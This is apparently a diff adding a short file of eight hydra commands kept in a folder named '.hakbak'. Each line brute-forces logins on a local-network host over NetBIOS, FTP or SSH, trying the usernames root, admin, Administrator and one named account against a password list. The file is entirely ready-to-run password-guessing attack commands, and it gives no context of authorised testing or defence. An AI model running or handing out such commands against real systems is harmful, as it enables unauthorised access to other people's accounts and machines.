@@ -1,0 +1,8 @@
+hydra -t 1 -l TEN-JI -P /home/x/work/.hakbak/password.lst -vV 192.168.1.200 netbios-ssn
+hydra -t 1 -l root -P /home/x/work/.hakbak/password.lst -vV 192.168.1.200 ftp
+hydra -t 1 -l administrator -P /home/x/work/.hakbak/password.lst -vV 192.168.1.200 ftp
+hydra -t 1 -l Administrator -P /home/x/work/.hakbak/password.lst -vV 192.168.1.200 ftp
+hydra -t 1 -l admin -P /home/x/work/.hakbak/password.lst -vV 192.168.1.200 ftp
+hydra -t 1 -l Admin -P /home/x/work/.hakbak/password.lst -vV 192.168.1.200 ftp
+hydra -l root -P /home/x/work/.hakbak/password.lst -t 1 ssh://192.168.1.200
+hydra -l root -P /home/x/work/.hakbak/password.lst ssh://192.168.1.200
